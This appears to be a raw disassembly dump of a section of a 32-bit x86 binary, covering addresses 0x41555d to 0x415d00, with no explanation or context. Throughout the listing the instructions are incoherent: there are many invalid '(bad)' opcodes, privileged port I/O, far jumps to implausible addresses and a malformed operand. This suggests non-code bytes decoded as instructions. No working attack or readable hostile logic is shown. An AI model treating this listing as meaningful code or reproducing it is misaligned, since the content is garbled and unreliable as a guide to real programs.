  41555d:	xchg   esp,eax
  41555e:	mov    ecx,0x18336bd4
  415563:	sub    bh,BYTE PTR ds:0xe0a38f3a
  415569:	or     eax,0xa7d1c306
  41556e:	(bad)  
  41556f:	test   eax,0x5f1949bd
  415574:	sbb    dh,ah
  415576:	nop
  415577:	sti    
  415578:	mov    cl,0xa5
  41557a:	out    dx,al
  41557b:	int3   
  41557c:	out    dx,eax
  41557d:	pop    ecx
  41557e:	adc    BYTE PTR [ebx],al
  415580:	sbb    eax,DWORD PTR [edx]
  415582:	adc    ecx,DWORD PTR [esi-0xe]
  415585:	(bad)  ds:0x8df65f79
  41558b:	add    ecx,edi
  41558d:	lods   al,BYTE PTR ds:[esi]
  41558e:	and    al,0x44
  415590:	sti    
  415591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415592:	or     al,0x39
  415594:	dec    esi
  415595:	ins    BYTE PTR es:[edi],dx
  415596:	das    
  415597:	mov    ah,0x82
  415599:	lock inc esp
  41559b:	and    eax,0xd73cfe4d
  4155a0:	cmp    esp,esp
  4155a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155a3:	jae    0x415584
  4155a5:	push   es
  4155a6:	sar    edx,1
  4155a8:	xchg   ecx,eax
  4155a9:	stos   BYTE PTR es:[edi],al
  4155aa:	outs   dx,BYTE PTR ds:[esi]
  4155ab:	mov    ds:0x52f26a66,eax
  4155b0:	pop    ecx
  4155b1:	scas   eax,DWORD PTR es:[edi]
  4155b2:	ja     0x41560e
  4155b4:	cdq    
  4155b5:	lds    eax,FWORD PTR [esi-0x40bad3d7]
  4155bb:	sub    esp,eax
  4155bd:	out    dx,eax
  4155be:	mov    al,0xb8
  4155c0:	and    ah,0x80
  4155c3:	sbb    eax,0x8711140c
  4155c8:	neg    DWORD PTR [ecx]
  4155ca:	arpl   WORD PTR [edx+0x73ad56f7],si
  4155d0:	repz fsubr DWORD PTR [ebx+0x71b3d11]
  4155d7:	cmovno ebx,DWORD PTR [ecx+0x6a]
  4155db:	ret    0x57bd
  4155de:	fisubr DWORD PTR [edx]
  4155e0:	dec    esp
  4155e1:	aaa    
  4155e2:	and    al,0x60
  4155e4:	fnstsw WORD PTR [ebx-0x4f]
  4155e7:	retf   0x15ed
  4155ea:	das    
  4155eb:	jmp    0x415572
  4155ed:	pop    edx
  4155ee:	imul   eax,DWORD PTR [ebx+0x2d7ffa87],0xffffff84
  4155f5:	fs jmp 0x5f2d:0x59f00c49
  4155fd:	cmp    al,ah
  4155ff:	lahf   
  415600:	xor    BYTE PTR [edx],cl
  415602:	nop
  415603:	les    ecx,FWORD PTR ds:0x46850392
  415609:	add    al,0x6e
  41560b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41560c:	imul   DWORD PTR [edx]
  41560e:	adc    eax,DWORD PTR [ecx]
  415610:	in     al,dx
  415611:	aad    0xd0
  415613:	pop    ecx
  415614:	aaa    
  415615:	out    dx,al
  415616:	bswap  ecx
  415618:	(bad)  
  41561a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41561b:	xlat   BYTE PTR ds:[ebx]
  41561c:	out    0x1f,al
  41561e:	ret    
  41561f:	(bad)  
  415620:	or     bh,BYTE PTR [edx]
  415622:	mov    dh,0x22
  415624:	mov    eax,0x8c02383b
  415629:	fistp  QWORD PTR [ebp+0x45]
  41562d:	out    dx,al
  41562e:	in     al,0x68
  415630:	sbb    al,0xd2
  415632:	outs   dx,BYTE PTR ds:[esi]
  415633:	mov    ch,0x81
  415635:	xchg   edx,eax
  415636:	pusha  
  415637:	push   cs
  415638:	xor    al,0xf6
  41563a:	sbb    ecx,ebx
  41563c:	mov    bh,0xb7
  41563e:	push   ebp
  41563f:	push   ebx
  415640:	xchg   BYTE PTR [edi],bl
  415642:	adc    BYTE PTR [esp+eax*8+0x3d],0x15
  415647:	or     BYTE PTR [ebx],ah
  415649:	jmp    0xa4af018e
  41564e:	in     al,0x84
  415650:	mov    edx,0x16dcbf97
  415655:	add    esp,DWORD PTR [ecx+0x66]
  415658:	aad    0xbc
  41565a:	xor    BYTE PTR [edx+ebx*2],bl
  41565d:	das    
  41565e:	call   0x17cddfd8
  415663:	mov    ds:0xaf475247,al
  415668:	jmp    0x41564d
  41566a:	div    DWORD PTR [edi]
  41566c:	adc    bh,al
  41566e:	mov    eax,0x37943b5d
  415673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415674:	jnp    0x41560e
  415676:	pop    es
  415677:	xchg   edx,eax
  415678:	sbb    ch,BYTE PTR [ecx+0x18]
  41567b:	sti    
  41567c:	push   cs
  41567d:	inc    esi
  41567e:	sub    al,0xd0
  415680:	xchg   esi,eax
  415681:	out    0xe9,al
  415683:	loop   0x41565f
  415685:	pop    eax
  415686:	fwait
  415687:	dec    esi
  415688:	into   
  415689:	and    ebx,DWORD PTR [eax+edi*2-0x167b2b95]
  415690:	or     al,0xbc
  415692:	int    0x29
  415694:	xor    dl,BYTE PTR [ecx-0x7a]
  415697:	(bad)  
  415699:	stc    
  41569a:	sar    DWORD PTR [eax+0xa6ed8d4],cl
  4156a0:	ret    0xdd48
  4156a3:	pop    eax
  4156a4:	add    BYTE PTR [edi],dl
  4156a6:	lahf   
  4156a7:	adc    ebp,ecx
  4156a9:	pop    ebx
  4156aa:	adc    eax,0xc7240af5
  4156af:	add    ch,BYTE PTR [esi+0x6]
  4156b2:	int3   
  4156b3:	div    DWORD PTR [edi]
  4156b5:	jmp    0x41572d
  4156b7:	iret   
  4156b8:	dec    ebx
  4156b9:	or     edi,esp
  4156bb:	jno    0x41571a
  4156bd:	xor    DWORD PTR [edi+ebp*8],0xe5a058f9
  4156c4:	push   edx
  4156c5:	imul   ecx,DWORD PTR [ebx-0x3b8c2535],0xffffffe0
  4156cc:	sbb    ah,BYTE PTR [ebp+0x70]
  4156cf:	dec    ebp
  4156d0:	shl    esp,1
  4156d2:	mov    esi,0x139ca2dc
  4156d7:	push   ecx
  4156d8:	xor    edx,DWORD PTR [eax+0x3e]
  4156db:	xor    bl,BYTE PTR [esi+0x9]
  4156de:	(bad)  
  4156df:	or     eax,0xe4d7c74d
  4156e4:	mov    eax,ds:0x2a0eefa
  4156e9:	push   ecx
  4156ea:	xor    DWORD PTR [edx+0x7c],esi
  4156ed:	repz js 0x415723
  4156f0:	stos   BYTE PTR es:[edi],al
  4156f1:	xchg   edx,eax
  4156f2:	pusha  
  4156f3:	fsubr  DWORD PTR [esi+edi*8+0x45]
  4156f7:	mov    dh,0x5e
  4156f9:	pushf  
  4156fa:	js     0x4156ea
  4156fc:	jl     0x415707
  4156fe:	and    eax,0x9c34b093
  415703:	js     0x4156ad
  415705:	(bad)  
  415706:	aam    0xec
  415708:	push   ebp
  415709:	add    eax,0x138b0093
  41570e:	sahf   
  41570f:	les    edi,FWORD PTR [eax]
  415711:	or     eax,0xf514af1c
  415716:	jbe    0x4156e1
  415718:	dec    eax
  415719:	lods   eax,DWORD PTR ds:[esi]
  41571a:	jns    0x415740
  41571c:	mov    BYTE PTR [esi-0x29],dh
  41571f:	mov    bl,0xaf
  415721:	sub    BYTE PTR [edx-0x76],ah
  415724:	in     al,dx
  415725:	jecxz  0x4156ea
  415727:	sbb    eax,0xc503784b
  41572c:	cmova  ebp,DWORD PTR ds:0xb592ab52
  415733:	fs jmp 0x4157b0
  415736:	mov    bl,0x4d
  415738:	fwait
  415739:	adc    DWORD PTR [edi],ecx
  41573b:	or     eax,0xe00db15b
  415740:	xor    DWORD PTR [esi+0x43093bf9],edi
  415746:	inc    esi
  415747:	sahf   
  415748:	icebp  
  415749:	clc    
  41574a:	add    eax,0x3ff283f6
  41574f:	mov    bl,0xca
  415751:	fistp  DWORD PTR [ebx-0x13]
  415754:	int3   
  415755:	clc    
  415756:	lahf   
  415757:	and    esp,eax
  415759:	xor    al,0x5a
  41575b:	(bad)  
  41575c:	dec    ebx
  41575d:	sub    eax,0x6ac7b29f
  415762:	add    al,0x74
  415764:	jg     0x4156f8
  415766:	pop    ebp
  415767:	shr    BYTE PTR [esp+ebp*8+0x17],cl
  41576b:	xchg   esi,eax
  41576c:	xor    BYTE PTR [esi+0x8e08f17],ch
  415772:	jae    0x4156f6
  415774:	dec    ebp
  415775:	repz imul ebx,DWORD PTR [ebx+0x7cf01da9],0x90f8ca1c
  415780:	retf   0x6883
  415783:	cmp    DWORD PTR [esi],esp
  415785:	sub    esp,DWORD PTR [esi+0x411bf123]
  41578b:	retf   0x8a15
  41578e:	dec    esi
  41578f:	sbb    DWORD PTR [esi],eax
  415791:	add    al,0x89
  415793:	inc    edi
  415794:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415795:	jae    0x41578b
  415797:	adc    al,0x1b
  415799:	and    eax,0xe9ac96e5
  41579e:	and    dh,cl
  4157a0:	lock xor eax,0x753cea0e
  4157a6:	sub    ecx,ebx
  4157a8:	pop    esp
  4157a9:	cmp    eax,0x3f047822
  4157ae:	(bad)  
  4157af:	pop    edx
  4157b0:	out    0xd1,eax
  4157b2:	sbb    DWORD PTR [edi],eax
  4157b4:	out    dx,al
  4157b5:	call   0xd9e84d81
  4157ba:	mov    dl,0x4
  4157bc:	loop   0x415790
  4157be:	and    ebp,DWORD PTR [ecx+0x26]
  4157c1:	push   edx
  4157c2:	or     al,0x65
  4157c4:	xor    ch,BYTE PTR [ebp+0x19]
  4157c7:	jmp    0x7c7bf9c
  4157cc:	and    bh,BYTE PTR [ebp-0x44]
  4157cf:	(bad)
  4157d2:	sub    BYTE PTR [esp+eiz*2-0x20414293],dh
  4157d9:	lahf   
  4157da:	enter  0xa9e6,0xe7
  4157de:	mov    BYTE PTR [ebx-0x24],ch
  4157e1:	or     ch,BYTE PTR [esi-0xa]
  4157e4:	imul   ebx,eax,0xed6c9075
  4157ea:	pushf  
  4157eb:	and    eax,0x7590712e
  4157f0:	jo     0x41577d
  4157f2:	push   esi
  4157f3:	sar    BYTE PTR [esi*8+0x72f32592],0x88
  4157fb:	push   edi
  4157fc:	rol    BYTE PTR [ecx],0x58
  4157ff:	inc    ebx
  415800:	repz test DWORD PTR [edx+eiz*2],edx
  415804:	sub    al,0xbd
  415806:	lea    esp,[eax-0x2b1dfcd8]
  41580c:	xchg   ebp,eax
  41580d:	jge    0x4157c4
  41580f:	inc    edi
  415810:	add    eax,0x14b149c7
  415815:	loop   0x41586d
  415817:	aaa    
  415818:	jg     0x415820
  41581a:	jno    0x415871
  41581c:	or     DWORD PTR [edx+0x789686a1],0x59e5cf8b
  415826:	mov    eax,0x63c9e3e0
  41582b:	aas    
  41582c:	and    ah,BYTE PTR [ecx-0x2d]
  41582f:	addr16 jg 0x4157ef
  415832:	and    BYTE PTR [ebx],dh
  415834:	mov    ds:0xea6f7d1d,al
  415839:	and    BYTE PTR [ebx-0x7],0xd0
  41583d:	dec    edx
  41583e:	adc    DWORD PTR [edx],esp
  415840:	cmp    al,0xd7
  415842:	(bad)  
  415843:	fidiv  WORD PTR [esi+0x42566707]
  415849:	cmp    eax,0x555c8294
  41584e:	mov    ds:0x11f8ba8a,al
  415853:	mov    edx,0xb0577590
  415858:	push   edi
  415859:	pop    es
  41585a:	and    esi,DWORD PTR [ecx+eiz*8]
  41585d:	outs   dx,DWORD PTR ds:[esi]
  41585e:	cwde   
  41585f:	sbb    DWORD PTR [edi+ebp*2+0x78],esi
  415863:	inc    eax
  415864:	cld    
  415865:	mov    ds:0x23a55f4a,al
  41586a:	into   
  41586b:	xor    al,0x6e
  41586d:	mov    bl,0x71
  41586f:	repnz cld 
  415871:	jno    0x415822
  415873:	sbb    al,BYTE PTR [edi-0x5d]
  415876:	ret    
  415877:	pop    esi
  415878:	pushf  
  415879:	data16 into 
  41587b:	push   0xffffffd0
  41587d:	inc    esi
  41587e:	mov    cl,0xb9
  415880:	ins    DWORD PTR es:[edi],dx
  415881:	aas    
  415882:	cdq    
  415883:	cmp    al,0x54
  415885:	xor    eax,0x31aa2abb
  41588a:	adc    al,0xe8
  41588c:	retf   0xdf1e
  41588f:	retf   
  415890:	ret    
  415891:	cmp    eax,0xbc6e814c
  415896:	lods   al,BYTE PTR ds:[esi]
  415897:	xchg   esp,eax
  415898:	pop    edi
  415899:	jecxz  0x415832
  41589b:	(bad)  
  41589c:	fld    TBYTE PTR [ebp+edi*1+0x62fb9b37]
  4158a3:	adc    DWORD PTR [ebp-0x4a3876e1],0x696a9d82
  4158ad:	and    al,0xd3
  4158af:	add    edx,esp
  4158b1:	cld    
  4158b2:	retf   
  4158b3:	ret    
  4158b4:	cmp    al,0x96
  4158b6:	in     al,0x3a
  4158b8:	mov    WORD PTR [ebx+edi*8-0x2bc8660a],ss
  4158bf:	mov    al,ds:0x10302788
  4158c4:	xor    dl,BYTE PTR [ebp-0x78]
  4158c7:	aad    0x7f
  4158c9:	or     al,0x77
  4158cb:	xchg   edi,eax
  4158cc:	xor    al,0x0
  4158ce:	adc    ecx,DWORD PTR [esi+0x24714187]
  4158d4:	fiadd  DWORD PTR [edx-0x34]
  4158d7:	pop    es
  4158d8:	sbb    DWORD PTR [eax-0x45],edi
  4158db:	mov    dl,0x27
  4158dd:	mov    edx,ebp
  4158df:	outs   dx,BYTE PTR ds:[esi]
  4158e0:	push   ebp
  4158e1:	icebp  
  4158e2:	shl    BYTE PTR [eax+0x6ccaecc2],1
  4158e8:	cmp    DWORD PTR [eax-0x1301b634],edi
  4158ee:	jmp    0xdf9516f8
  4158f3:	cmp    al,0x46
  4158f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158f6:	mov    ?,WORD PTR [ebx+edx*8-0x5c]
  4158fa:	pop    eax
  4158fb:	(bad)  
  4158fc:	retf   0x49
  4158ff:	mov    ch,0xe7
  415901:	jle    0x41595b
  415903:	cmp    cl,ah
  415905:	cmp    eax,0xf87af039
  41590a:	fisub  DWORD PTR [eax-0x72]
  41590d:	adc    al,0x57
  41590f:	call   0xd88d:0x14c1bb6
  415916:	mov    eax,ds:0xb30672f6
  41591b:	fcom   DWORD PTR [ebx]
  41591d:	imul   DWORD PTR [ebp+0x34]
  415920:	shr    BYTE PTR [edi-0x4d],cl
  415923:	fisubr WORD PTR [ecx-0x2d]
  415926:	pop    edx
  415927:	add    BYTE PTR gs:[edx],bl
  41592a:	xor    BYTE PTR [ebx],bh
  41592c:	scas   al,BYTE PTR es:[edi]
  41592d:	push   cs
  41592e:	pop    es
  41592f:	mov    al,ds:0xe88fc3b5
  415934:	daa    
  415935:	ret    
  415936:	(bad)  
  415937:	cli    
  415938:	out    0x18,al
  41593a:	jno    0x4158dd
  41593c:	xchg   esp,eax
  41593d:	sub    ebx,edi
  41593f:	fcom   DWORD PTR [ecx-0x36c069d6]
  415945:	shr    BYTE PTR [ebx+0x199c18a7],1
  41594b:	jl     0x4158ec
  41594d:	push   ebx
  41594e:	mov    dh,0xb6
  415950:	cmp    cl,BYTE PTR [esi]
  415952:	lahf   
  415953:	test   DWORD PTR [ecx-0x58d43ea4],edx
  415959:	int    0xf9
  41595b:	ds (bad) 
  41595d:	rcl    esi,cl
  41595f:	sbb    al,0xf0
  415961:	or     al,BYTE PTR ds:0x811aefa9
  415967:	stos   BYTE PTR es:[edi],al
  415968:	jle    0x4158fc
  41596a:	push   ss
  41596b:	inc    edi
  41596c:	cmc    
  41596d:	in     al,0x7b
  41596f:	paddsb mm6,QWORD PTR [esi]
  415972:	(bad)
  415975:	xchg   ebx,eax
  415976:	mov    bl,0x89
  415978:	test   DWORD PTR ds:0x7c53cb64,esi
  41597e:	and    al,0xd7
  415980:	push   edi
  415981:	ret    
  415982:	lds    edx,FWORD PTR [esi-0x621653ea]
  415988:	(bad)  
  41598a:	xchg   esi,eax
  41598b:	push   edx
  41598c:	jg     0x4159fe
  41598e:	jae    0x415a0c
  415990:	sbb    esp,DWORD PTR [ebp+0x37]
  415993:	push   edx
  415994:	or     DWORD PTR [edi+0x2de707dc],ebp
  41599a:	iret   
  41599b:	xchg   eax,ebp
  41599d:	fistp  DWORD PTR [edi]
  41599f:	pop    edi
  4159a0:	faddp  st(5),st
  4159a2:	push   ss
  4159a3:	and    al,BYTE PTR [ecx-0x80]
  4159a6:	cmp    al,0x2b
  4159a8:	in     al,dx
  4159a9:	mov    ah,ch
  4159ab:	inc    DWORD PTR cs:[edx+0x7e2a16cc]
  4159b2:	mov    al,ds:0x7d81f64e
  4159b7:	xchg   esp,eax
  4159b8:	adc    al,0xd5
  4159ba:	gs int3 
  4159bc:	xchg   esp,eax
  4159bd:	jne    0x4159ba
  4159bf:	sub    eax,0x964bee9d
  4159c4:	add    DWORD PTR [ecx-0xd],0xffffffdb
  4159c8:	mov    DWORD PTR [edi+0x7e],eax
  4159cb:	jmp    0x2df669ce
  4159d0:	sbb    al,0x17
  4159d2:	or     al,0xae
  4159d4:	xchg   DWORD PTR ds:0xd02eaf6d,edx
  4159da:	add    ebp,esp
  4159dc:	call   0x7a72:0x9c342a38
  4159e3:	jmp    0x4159d2
  4159e5:	push   ds
  4159e6:	sbb    al,0x4e
  4159e8:	iret   
  4159e9:	add    eax,0xa031f747
  4159ee:	(bad)  
  4159ef:	ror    esp,cl
  4159f1:	int    0x42
  4159f3:	les    ebx,FWORD PTR [eax+0x1adb6c0d]
  4159f9:	cmp    ah,bh
  4159fb:	jo     0x415a5f
  4159fd:	jbe    0x415a68
  4159ff:	in     al,dx
  415a00:	pop    ds
  415a01:	jnp    0x415a32
  415a03:	jns    0x4159f9
  415a05:	xchg   ebp,eax
  415a06:	xchg   DWORD PTR [eax],ecx
  415a08:	jmp    0x415a42
  415a0a:	jb     0x4159b1
  415a0c:	adc    dl,al
  415a0e:	ins    BYTE PTR es:[edi],dx
  415a0f:	sti    
  415a10:	mov    dl,cl
  415a12:	stos   DWORD PTR es:[edi],eax
  415a13:	in     eax,dx
  415a14:	jmp    0x3e15d293
  415a19:	and    DWORD PTR ds:0xa7b0127f,edx
  415a1f:	and    BYTE PTR [esi+esi*1],bl
  415a22:	in     al,0x7d
  415a24:	cmp    al,0x2c
  415a26:	pop    edx
  415a27:	(bad)  [edi]
  415a29:	cli    
  415a2a:	aam    0x9c
  415a2c:	sbb    BYTE PTR [eax+0x10],0xce
  415a30:	les    esi,FWORD PTR ds:0x7ceac2e0
  415a36:	jmp    0xbc36f48d
  415a3b:	scas   al,BYTE PTR es:[edi]
  415a3c:	mov    al,0x1f
  415a3e:	sub    ecx,DWORD PTR [edx+0x1ba0752a]
  415a44:	push   edx
  415a45:	pop    edi
  415a46:	or     DWORD PTR [esi],ecx
  415a48:	out    0x74,eax
  415a4a:	(bad)  
  415a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a4c:	jne    0x4159d6
  415a4e:	sbb    edx,DWORD PTR [ebx+0x2292f688]
  415a54:	jnp    0x4159ea
  415a56:	mov    eax,ebp
  415a58:	lea    esp,[ebx-0x4dcac26d]
  415a5e:	pop    ecx
  415a5f:	icebp  
  415a60:	pop    edx
  415a61:	fdiv   st(5),st
  415a63:	(bad)  
  415a64:	shr    DWORD PTR [ebp+ebp*8+0x21],cl
  415a68:	sbb    eax,0x8a760b07
  415a6d:	inc    edx
  415a6e:	add    al,0x1
  415a70:	lds    esp,FWORD PTR [edx]
  415a72:	sbb    eax,0xae2b7555
  415a77:	outs   dx,DWORD PTR ds:[esi]
  415a78:	jecxz  0x415af0
  415a7a:	(bad)  
  415a7b:	mov    ebx,0xdb0cd39a
  415a80:	je     0x3eb226b
  415a86:	push   ecx
  415a87:	mov    ecx,es
  415a89:	in     eax,dx
  415a8a:	mov    al,BYTE PTR [eax-0x75303e72]
  415a90:	or     al,0xab
  415a92:	push   0x42
  415a94:	cwde   
  415a95:	or     al,0x88
  415a97:	push   esp
  415a98:	loope  0x415acf
  415a9a:	jmp    0x415a4e
  415a9c:	mov    dl,0x2b
  415a9e:	pop    ebx
  415a9f:	sub    al,0x65
  415aa1:	mov    bl,0xf4
  415aa3:	xor    ebx,DWORD PTR [ebx]
  415aa5:	mov    dl,0x20
  415aa7:	sub    eax,DWORD PTR [edx]
  415aa9:	dec    esp
  415aaa:	icebp  
  415aab:	lods   eax,DWORD PTR ds:[esi]
  415aac:	dec    edx
  415aad:	mov    DWORD PTR [ecx+0x4d],ebx
  415ab0:	cmp    esi,DWORD PTR [eax]
  415ab2:	jecxz  0x415af8
  415ab4:	stc    
  415ab5:	fisttp QWORD PTR [ebp-0x44b29981]
  415abb:	mov    ds:0xeb394f76,eax
  415ac0:	or     DWORD PTR [esi+0x7e714ed6],esi
  415ac6:	pop    ebx
  415ac7:	mov    bh,0xe3
  415ac9:	aam    0xd4
  415acb:	inc    edi
  415acc:	sbb    eax,0x30fefe39
  415ad1:	and    al,ch
  415ad3:	test   al,0x10
  415ad5:	scas   eax,DWORD PTR es:[edi]
  415ad6:	cmp    eax,0xddf68332
  415adb:	dec    ecx
  415adc:	push   ss
  415add:	pop    eax
  415ade:	jge    0x415a97
  415ae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ae1:	(bad)
  415ae5:	mov    ss,WORD PTR [ebp+0x26]
  415ae8:	pop    ebp
  415ae9:	repz clc 
  415aeb:	cs and al,0x9a
  415aee:	mov    al,0x22
  415af0:	xchg   ecx,eax
  415af1:	mov    cl,0xf1
  415af3:	push   0x776024ba
  415af8:	jnp    0x415b3a
  415afa:	ud1    esi,DWORD PTR [edx]
  415afd:	sbb    esp,DWORD PTR [ebp-0x30fbf8db]
  415b03:	out    0x89,al
  415b05:	add    al,0x3c
  415b07:	push   ebp
  415b08:	mov    es,WORD PTR [edx-0x2742d4cc]
  415b0e:	push   ecx
  415b0f:	adc    al,0xfd
  415b11:	push   ecx
  415b12:	je     0x415aa1
  415b14:	retf   
  415b15:	xchg   edi,eax
  415b16:	loop   0x415aa9
  415b18:	lods   eax,DWORD PTR ds:[esi]
  415b19:	jmp    0x415b99
  415b1b:	xor    ebx,DWORD PTR [edx]
  415b1d:	ins    BYTE PTR es:[edi],dx
  415b1e:	test   BYTE PTR [ebx-0x7],dl
  415b21:	jo     0x415ac2
  415b23:	push   ecx
  415b24:	sub    BYTE PTR [edi-0x5e],dl
  415b27:	add    di,si
  415b2a:	adc    eax,0x53f1b0d9
  415b2f:	data16 mov dl,0xdf
  415b32:	hlt    
  415b33:	cs mov ebx,0xae9d2f44
  415b39:	(bad)  
  415b3a:	push   esi
  415b3b:	xchg   esp,eax
  415b3c:	or     bl,BYTE PTR [edx]
  415b3e:	std    
  415b3f:	xchg   ebx,eax
  415b40:	idiv   DWORD PTR [ebx+0x22694e5e]
  415b46:	cmp    bl,bl
  415b48:	jnp    0x415b22
  415b4a:	call   0x59961be4
  415b4f:	test   al,0xd3
  415b51:	dec    ecx
  415b52:	cwde   
  415b53:	jmp    DWORD PTR [eax]
  415b55:	ret    
  415b56:	(bad)  
  415b57:	addr16 enter 0x4a4a,0xf8
  415b5c:	adc    esp,DWORD PTR [ecx+0x72a29e48]
  415b62:	out    0x1d,al
  415b64:	lea    ecx,[eax+ebp*1]
  415b67:	cmp    dh,BYTE PTR [edx]
  415b69:	push   0x3e
  415b6b:	sub    eax,0xbe313983
  415b70:	and    dh,BYTE PTR [edx]
  415b72:	xor    DWORD PTR [edi-0x48],ebp
  415b75:	fild   QWORD PTR [edx]
  415b77:	push   bx
  415b79:	inc    edx
  415b7b:	je     0x415bf6
  415b7d:	cld    
  415b7e:	xchg   ecx,eax
  415b7f:	and    dh,BYTE PTR ds:0x76c0508
  415b85:	and    DWORD PTR [edx-0x4a6615f1],0x53565d94
  415b8f:	sti    
  415b90:	fld    DWORD PTR [esi]
  415b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b93:	sub    ecx,DWORD PTR [ecx+0x4]
  415b96:	enter  0x9639,0x5d
  415b9a:	jno    0x415b9c
  415b9c:	or     BYTE PTR [edi+edx*2],dl
  415b9f:	lods   al,BYTE PTR ds:[esi]
  415ba0:	jns    0x415c16
  415ba2:	cdq    
  415ba3:	jno    0x415b6e
  415ba5:	add    BYTE PTR [edi+0xe7fc532],ah
  415bab:	push   0x2a
  415bad:	or     DWORD PTR [ebp-0x21],ecx
  415bb0:	sub    DWORD PTR [eax+0x3365a5c2],ebx
  415bb6:	mov    cl,0xf8
  415bb8:	faddp  st(7),st
  415bba:	mov    al,0x11
  415bbc:	xchg   esi,eax
  415bbd:	out    0x0,eax
  415bbf:	retf   
  415bc0:	les    esi,FWORD PTR [ebx+0x59]
  415bc3:	aam    0xa4
  415bc5:	adc    DWORD PTR [ebx+0x62],edi
  415bc8:	mov    ecx,0x1b69f2de
  415bcd:	cmp    DWORD PTR [edi-0x2d],0x5860cd6e
  415bd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bd5:	call   0xec2e:0xa0a603fb
  415bdc:	lahf   
  415bdd:	pop    es
  415bde:	jl     0x415c0f
  415be0:	test   eax,0x90a5d299
  415be5:	add    BYTE PTR [eax+0x47],bl
  415be8:	ror    DWORD PTR [ebx+eiz*4+0x2f],cl
  415bec:	jae    0x415be2
  415bee:	jle    0x415c33
  415bf0:	jge    0x415b87
  415bf2:	sub    BYTE PTR [edi-0x3b0ffcdb],al
  415bf8:	cmovg  esp,DWORD PTR [edx+0x65]
  415bfc:	ds stos DWORD PTR es:[edi],eax
  415bfe:	std    
  415bff:	push   ds
  415c00:	test   BYTE PTR [edx],bl
  415c02:	and    al,0x93
  415c04:	xchg   esp,eax
  415c05:	es adc ch,ah
  415c08:	cdq    
  415c09:	scas   eax,DWORD PTR es:[edi]
  415c0a:	pop    es
  415c0b:	jle    0x415ba4
  415c0d:	es mov ah,0x65
  415c10:	inc    esi
  415c11:	iret   
  415c12:	je     0x415c08
  415c14:	or     al,0x11
  415c16:	xchg   edx,eax
  415c17:	jae    0x415be8
  415c19:	mov    eax,0xe9bd6646
  415c1e:	lea    eax,[edx+0x28]
  415c21:	int    0x38
  415c23:	call   0xf747becd
  415c28:	add    ah,BYTE PTR [edi]
  415c2a:	sub    dl,BYTE PTR [edi-0x4f]
  415c2d:	ja     0x415c62
  415c2f:	jg     0x415c02
  415c31:	fisub  DWORD PTR [ecx]
  415c33:	sbb    BYTE PTR [edx-0x773eb19a],bh
  415c39:	pop    ebx
  415c3a:	stos   DWORD PTR es:[edi],eax
  415c3b:	add    eax,0x380c970e
  415c40:	mov    esi,0x1508144e
  415c45:	stc    
  415c46:	lds    ecx,FWORD PTR [edx+edx*8]
  415c49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c4a:	les    edx,FWORD PTR [ebp+0x43417d07]
  415c50:	inc    ebp
  415c51:	imul   edi,DWORD PTR [edi],0x17cc3788
  415c57:	sub    eax,0xea23e0bb
  415c5c:	aas    
  415c5d:	je     0x415cd7
  415c5f:	cmp    esp,ecx
  415c61:	imul   eax,ecx,0xffffff89
  415c64:	xchg   ecx,eax
  415c65:	inc    esi
  415c66:	cmp    esp,DWORD PTR [edx+0x7e]
  415c69:	jb     0x415c29
  415c6b:	mov    ebx,0xfca2f9ef
  415c70:	add    esi,eax
  415c72:	int    0x48
  415c74:	scas   eax,DWORD PTR es:[edi]
  415c75:	push   ecx
  415c76:	ja     0x415cb4
  415c78:	sbb    ch,bl
  415c7a:	inc    esp
  415c7b:	jecxz  0x415c40
  415c7d:	push   ecx
  415c7e:	lds    esi,FWORD PTR [edi+0x37]
  415c81:	inc    edx
  415c82:	aad    0xd2
  415c84:	pop    edi
  415c85:	xor    cx,WORD PTR [ebx+edx*2]
  415c89:	lods   al,BYTE PTR ds:[esi]
  415c8a:	push   esp
  415c8b:	or     BYTE PTR [edx],bh
  415c8d:	pop    edi
  415c8e:	dec    ebx
  415c8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c90:	cmp    bl,cl
  415c92:	not    DWORD PTR [edx+eax*8]
  415c95:	(bad)  
  415c96:	dec    edi
  415c97:	lea    esp,[edi+0x34]
  415c9a:	pop    es
  415c9b:	mov    esp,0x6f48e7f1
  415ca0:	lods   al,BYTE PTR ds:[esi]
  415ca1:	pusha  
  415ca2:	lea    edx,[esi*2-0x34dbf4f0]
  415ca9:	in     eax,0xf2
  415cab:	shr    edi,1
  415cad:	int3   
  415cae:	sbb    DWORD PTR [ebp+0x46],ebp
  415cb1:	fdivr  QWORD PTR [esi]
  415cb3:	and    al,0x60
  415cb5:	xchg   edx,eax
  415cb6:	out    dx,eax
  415cb7:	loope  0x415c57
  415cb9:	inc    ebx
  415cba:	(bad)  
  415cbc:	rol    BYTE PTR [eax+0x3c],cl
  415cbf:	mov    cl,BYTE PTR [edi-0x76]
  415cc2:	mov    WORD PTR [ecx],fs
  415cc4:	(bad)  [eax]
  415cc6:	in     al,0x36
  415cc8:	jns    0x415d36
  415cca:	lock xor eax,0xf51fe563
  415cd0:	iret   
  415cd1:	and    al,BYTE PTR [ecx-0x1f1015ec]
  415cd7:	jae    0x415d32
  415cd9:	or     esp,edx
  415cdb:	lds    esi,FWORD PTR [edx+0x3b]
  415cde:	gs (bad) 
  415ce0:	lahf   
  415ce1:	test   eax,0x15cf655b
  415ce6:	adc    al,BYTE PTR [eax]
  415ce8:	xchg   ebp,eax
  415ce9:	push   edx
  415cea:	jge    0x415d18
  415cec:	dec    ebx
  415ced:	cs cmp dl,bh
  415cf0:	(bad)  
  415cf1:	mov    bh,0x6
  415cf3:	or     ebp,DWORD PTR [ecx]
  415cf5:	sahf   
  415cf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cf7:	or     eax,0xcbe3e522
  415cfc:	pop    edx
  415cfd:	inc    edx
  415cfe:	xchg   ecx,eax
  415cff:	push   es
  415d00:	inc    esp
